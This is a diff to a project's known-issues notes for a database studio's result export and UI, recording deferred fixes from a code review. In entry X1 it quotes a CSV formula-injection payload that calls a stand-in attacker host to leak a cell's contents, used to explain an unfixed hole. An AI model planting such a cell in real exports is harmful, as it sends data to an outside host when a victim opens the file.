@@ -243,7 +243,86 @@ deprecated against this entry (#288): it becomes real, or goes away in a major, 
 
 ## Studio UI and query execution
 
-The entry below came out of the #384 review, verified against the merged code.
+`U2` came out of the #384 review, verified against the merged code. The `X` entries came out of the
+#422 review of the export path — each one was named, weighed and deliberately left out of that PR, so
+they are recorded here rather than re-derived by the next reader.
+
+### X1. A CSV cell beginning `=`, `+`, `-` or `@` is a formula to a spreadsheet
+
+`src/lib/export/csv.ts` writes the value it was given, exactly. A cell holding
+`=HYPERLINK("http://attacker/"&A1)` is data in the database and a formula in Excel, LibreOffice and
+Google Sheets — evaluated when the file is opened by someone who did not write the query.
+
+The fix is not in doubt (prefix such a cell with a `'`, or wrap it), but it MUTATES the user's values
+on the way out, which is the opposite of what every other line in that file does. That is a product
+decision about which of two wrong answers to give, and it wants an owner: a checkbox on the export
+menu, a setting, or a rule the docs state.
+
+Done when a cell that a spreadsheet would evaluate cannot be evaluated by opening the file, and the
+choice is stated where the user makes it.
+
+### X2. An export writes the page the grid holds, not the result the user asked for
+
+Statements run under `DEFAULT_QUERY_LIMIT` (500) and paging fetches more only when asked, so every
+export is bounded by what is on screen. #422 made that visible — the count is on the Export button and
+the menu says when more rows are still on the server (`src/lib/export/scope.ts`) — which is honesty,
+not a fix.
+
+The fix is a server-side export: a route that streams the statement's full result through the same
+writers. `csv.ts` and `result-export.ts` are pure and hold no browser reference precisely so that a
+route can reuse them; `download.ts` is the only browser-bound module in that directory. Worth costing
+against the agent's own export gap (`B33`, `B34`), which wants the same route.
+
+### X3. A binary column exports as its JSON shape
+
+A `bytea`/`BLOB` value arrives in the browser as `{"type":"Buffer","data":[1,2,…]}` (the shape
+`JSON.stringify` gives a Node Buffer) and both the grid and the CSV write exactly that: a megabyte of
+data becomes about four megabytes of digits, and no reader can turn it back.
+
+Deliberately NOT fixed in the export path alone. `src/components/results-grid/renderers/` classifies a
+value by shape and is the one place both surfaces read; a binary rule belongs there, so that the grid,
+the row detail sheet and the export agree on hex, base64 or a truncation. Fixing only the writer would
+make the file disagree with the screen.
+
+### X7. The DDL export types a numeric or a timestamp column as TEXT, because the wire hands it a string
+
+Measured in the browser against the local `dvdrental` (2026-08-18):
+`SELECT rental_rate, last_update, film_id FROM film` exports as
+`CREATE TABLE … ("rental_rate" TEXT, "last_update" TEXT, "film_id" BIGINT)`.
+
+Nothing is wrong with the inference — it never sees a number. `pg` returns `numeric` as a string to
+keep its precision, the API serializes the result to JSON, and a `timestamp` is a string by the time
+the browser reads it. So a value-shaped guess can only ever recover integer, boolean and text, and the
+dialect spellings #422 added (`NUMBER(19)`, `BINARY_DOUBLE`, `DATETIME2`, …) apply to the three kinds
+that survive the wire.
+
+The type is not lost, only unreported: `QueryResult.columnTypes` is the channel for it, and only
+ClickHouse and Druid populate it today. Done when every provider fills `columnTypes` for the columns
+it declares — which is the provider triad's own work (code ↔ docs ↔ tests per type-id), one PR, and
+it also lets the grid label a column without guessing (`ResultsGrid.declaredTypeOf` already reads it).
+
+Guessing from a string's SHAPE is not the fix and should not be attempted: it types a text column
+holding `2026-01-01` as a timestamp.
+
+### X4. Four modals stay mounted while closed, so their code cannot be split
+
+`DataProfiler`, `CodeGenerator`, `TestDataGenerator` and `DataImportModal` render `null` when closed
+but are always mounted, so lazy-loading them buys nothing until the mount is gated — and gating the
+mount changes their semantics (state resets on close). That is a behaviour change, not a bundling one.
+
+### X5. `Studio.tsx` re-renders its whole tree on every keystroke
+
+14 `useState`, no `useMemo`/`useCallback`, no memoized children, React Compiler off. The
+code-splitting in #422 is not this fix and does not help it. It touches every prop in the shell, which
+is why it was not mixed into a correctness PR. `framer-motion` is also still in the first load
+(`Studio.tsx`, `ConnectionModal`, `SchemaExplorer`, `ConnectionItem`, `TableItem` all import it
+statically and all mount on arrival).
+
+### X6. 43 lists outside `SchemaDiff` are still keyed by index
+
+`VisualExplain`, `DatabaseDocs` and the monitoring/admin tabs. `SchemaDiff` was fixed in #422 because
+its rows are recomputed and reordered; the rest need reading one at a time to tell which are stable
+lists (where an index key is fine) from which are not.
 
 ### U2. The rule that catches an arity change on a JSX handler is configured but not aimed at components
 
